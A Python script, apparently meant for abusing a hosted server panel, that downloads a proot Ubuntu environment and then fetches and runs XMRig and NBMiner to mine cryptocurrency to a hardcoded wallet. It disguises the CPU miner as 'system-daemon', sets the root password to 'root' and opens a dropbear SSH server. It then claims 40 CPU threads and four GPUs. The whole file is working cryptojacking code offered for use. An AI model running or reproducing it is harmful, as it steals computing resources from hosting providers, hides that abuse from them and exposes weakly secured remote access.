import os, subprocess, urllib.request, tarfile, stat, shutil, warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

ETH_WALLET = "ETH:0xF09Bd9E017dd09aa7F56aeE15c90335207d34618.PteroXeon"
XMR_POOL = "rx.unmineable.com:443"
NBM_POOL = "ethash.unmineable.com:3333"

XMR_URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
NBM_URL = "https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz"
ROOTFS_URL = "https://cdimage.ubuntu.com/ubuntu-base/releases/22.04/release/ubuntu-base-22.04.5-base-amd64.tar.gz"
PROOT_URL = "https://proot.gitlab.io/proot/bin/proot"

FS_DIR = "ubuntu-fs"
PROOT_BIN = "proot"
PORT = os.environ.get('SERVER_PORT', '2222')

def download_file(url, dest):
    print(f"[*] Downloading: {url}")
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req) as response, open(dest, 'wb') as out_file:
        shutil.copyfileobj(response, out_file)

def setup_environment():
    if not os.path.exists(PROOT_BIN):
        download_file(PROOT_URL, PROOT_BIN)
        os.chmod(PROOT_BIN, os.stat(PROOT_BIN).st_mode | stat.S_IEXEC)

    if not os.path.exists(FS_DIR):
        os.makedirs(FS_DIR)
        tar_path = "ubuntu-rootfs.tar.gz"
        download_file(ROOTFS_URL, tar_path)
        print("[*] Extracting OS...")
        with tarfile.open(tar_path, "r:gz") as tar:
            try: tar.extractall(path=FS_DIR, filter='fully_trusted')
            except: tar.extractall(path=FS_DIR)
        os.remove(tar_path)
        
        with open(os.path.join(FS_DIR, "etc/resolv.conf"), "w") as f:
            f.write("nameserver 8.8.8.8\nnameserver 1.1.1.1\n")

    print("[*] Setting up Miners...")
    init_script = os.path.join(FS_DIR, "root/init.sh")
    with open(init_script, "w") as f:
        f.write(f"""#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
apt-get update
apt-get install -y ca-certificates wget tar curl dropbear
# Setup XMRig
wget -O xmrig.tar.gz {XMR_URL}
tar -xvzf xmrig.tar.gz --strip-components=1
mv xmrig /root/system-daemon
# Setup NBMiner
wget -O nbminer.tgz {NBM_URL}
tar -xvzf nbminer.tgz --strip-components=1
mv nbminer /root/nbminer
# Permission & Cleanup
chmod +x /root/system-daemon /root/nbminer
echo "root:root" | chpasswd
rm -rf xmrig* nbminer*
""")
    os.chmod(init_script, 0o755)
    subprocess.run([f"./{PROOT_BIN}", "-0", "-r", FS_DIR, "-b", "/dev", "-b", "/proc", "-b", "/sys", "-w", "/root", "/bin/bash", "/root/init.sh"])

def run_proot():
    start_cmd = f"""
    dropbear -p {PORT} -R
    echo "[*] GPU Miner starting..."
    /root/nbminer -a ethash -o stratum+tcp://{NBM_POOL} -u {ETH_WALLET} -d 0,1,2,3 -log > /root/nbminer.log 2>&1 &
    sleep 5
    echo "[*] CPU Miner starting..."
    /root/system-daemon -a rx/0 -o {XMR_POOL} -u {ETH_WALLET} -p x --tls --threads 40 --randomx-mode fast --cpu-priority 5
    """
    subprocess.run([f"./{PROOT_BIN}", "-0", "-r", FS_DIR, "-b", "/dev", "-b", "/proc", "-b", "/sys", "-w", "/root", "/bin/bash", "-c", start_cmd])

if __name__ == "__main__":
    if os.path.exists(FS_DIR):
        shutil.rmtree(FS_DIR)
    setup_environment()
    run_proot()
